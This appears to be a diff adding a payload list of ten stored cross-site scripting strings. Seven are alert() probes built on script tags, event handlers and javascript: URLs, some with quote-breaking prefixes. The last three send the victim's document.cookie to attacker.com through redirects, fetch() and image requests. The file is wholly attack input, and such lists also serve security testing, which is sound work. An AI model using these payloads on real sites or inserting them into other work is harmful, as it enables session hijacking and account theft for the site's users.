@@ -1,0 +1,10 @@
+<script>alert('Stored XSS')</script>
+<img src=x onerror=alert('Stored')>
+<svg onload=alert('Stored')>
+<iframe src=javascript:alert('Stored')>
+<body onload=alert('Stored')>
+"><script>alert('Stored')</script>
+'><script>alert('Stored')</script>
+<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
+<img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>
+<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>
